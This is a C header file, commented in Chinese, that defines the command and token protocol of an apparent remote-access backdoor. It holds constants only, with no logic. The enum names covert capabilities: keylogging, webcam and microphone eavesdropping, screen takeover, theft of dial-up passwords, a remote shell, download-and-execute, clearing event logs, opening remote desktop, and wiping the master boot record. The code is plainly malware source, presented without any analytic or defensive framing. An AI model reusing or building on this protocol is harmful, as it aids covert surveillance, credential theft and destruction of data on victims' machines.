
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

// BYTE最大也就256
enum
{
	// 文件傳輸方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者遠程已經有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆蓋
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆蓋
	TRANSFER_MODE_JUMP,				// 覆蓋
	TRANSFER_MODE_JUMP_ALL,			// 全部覆蓋
	TRANSFER_MODE_CANCEL,			// 取消傳送
	
	// 控制端發出的命令
	COMMAND_ACTIVED = 0x00,			// 服務端可以激活開始工作
	COMMAND_LIST_DRIVE,				// 列出磁盤目錄
	COMMAND_LIST_FILES,				// 列出目錄中的文件
	COMMAND_DOWN_FILES,				// 下載文件
	COMMAND_FILE_SIZE,				// 上傳時的文件大小
	COMMAND_FILE_DATA,				// 上傳時的文件數據
	COMMAND_EXCEPTION,				// 傳輸發生異常，需要重新傳輸
	COMMAND_CONTINUE,				// 傳輸正常，請求繼續發送數據
	COMMAND_STOP,					// 傳輸中止
	COMMAND_DELETE_FILE,			// 刪除文件
	COMMAND_DELETE_DIRECTORY,		// 刪除目錄
	COMMAND_SET_TRANSFER_MODE,		// 設置傳輸方式
	COMMAND_CREATE_FOLDER,			// 創建文件夾
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 顯示打開文件
	COMMAND_OPEN_FILE_HIDE,			// 隱藏打開文件
	
	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_SCREEN_RESET,			// 改變屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改變算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 發送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 鎖定服務端鍵盤鼠標輸入
	COMMAND_SCREEN_BLANK,			// 服務端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉層
	COMMAND_SCREEN_GET_CLIPBOARD,	// 獲取遠程剪貼版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 設置遠程剪帖版

	COMMAND_WEBCAM,					// 攝像頭
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 攝像頭數據要求經過H263壓縮
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 攝像頭數據要求原始高清模式
	COMMAND_WEBCAM_RESIZE,			// 攝像頭調整分辯率，後面跟兩個INT型的寬高
	COMMAND_NEXT,					// 下一步(控制端已經打開對話框)

	COMMAND_KEYBOARD,				// 鍵盤記錄
	COMMAND_KEYBOARD_OFFLINE,		// 開啟離線鍵盤記錄
	COMMAND_KEYBOARD_CLEAR,			// 清除鍵盤記錄內容

	COMMAND_AUDIO,					// 語音監聽

	COMMAND_SYSTEM,					// 系統管理（進程，窗口....）
	COMMAND_PSLIST,					// 進程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_DIALUPASS,				// 撥號密碼
	COMMAND_KILLPROCESS,			// 關閉進程
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 會話管理（關機，重啟，註銷, 卸載）
	COMMAND_REMOVE,					// 卸載後門
	COMMAND_DOWN_EXEC,				// 其它功能 - 下載執行
	COMMAND_UPDATE_SERVER,			// 其它功能 - 下載更新
	COMMAND_CLEAN_EVENT,			// 其它管理 - 清除系統日誌
	COMMAND_Open_3389,				// 增加功能 - 開3389
	COMMAND_OPEN_TEST,			    // 其它管理 - 自己測試用
	COMMAND_KILLMBR,			    // 系統相關 - KILLMBR
	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隱藏打開網頁
	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 顯示打開網頁
	COMMAND_RENAME_REMARK,			// 重命名備註
	COMMAND_REPLAY_HEARTBEAT,		// 回覆心跳包


	// 服務端發出的標識
	TOKEN_AUTH = 100,				// 要求驗證
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN,					// 上線包
	TOKEN_DRIVE_LIST,				// 驅動器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，傳輸文件時用
	TOKEN_FILE_DATA,				// 文件數據
	TOKEN_TRANSFER_FINISH,			// 傳輸完畢
	TOKEN_DELETE_FINISH,			// 刪除完畢
	TOKEN_GET_TRANSFER_MODE,		// 得到文件傳輸方式
	TOKEN_GET_FILEDATA,				// 遠程得到本地文件數據
	TOKEN_CREATEFOLDER_FINISH,		// 創建文件夾任務完成
	TOKEN_DATA_CONTINUE,			// 繼續傳輸數據
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作發生異常
	
	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一張圖
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一張圖
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看時發送剪帖版內容


	TOKEN_WEBCAM_BITMAPINFO,		// 攝像頭的BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// 攝像頭的圖像數據
	
	TOKEN_AUDIO_START,				// 開始語音監聽
	TOKEN_AUDIO_DATA,				// 語音監聽數據

	TOKEN_KEYBOARD_START,			// 鍵盤記錄開始
	TOKEN_KEYBOARD_DATA,			// 鍵盤記錄的數據
	
	TOKEN_PSLIST,					// 進程列表
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_DIALUPASS,				// 撥號密碼
	TOKEN_SHELL_START				// 遠程終端開始
};


#define	MAX_WRITE_RETRY			15 // 重試寫入文件次數
#define	MAX_SEND_BUFFER			1024 * 8 // 最大發送數據長度
#define MAX_RECV_BUFFER			1024 * 8 // 最大接收數據長度

#endif // !defined(AFX_MACROS_H_INCLUDED)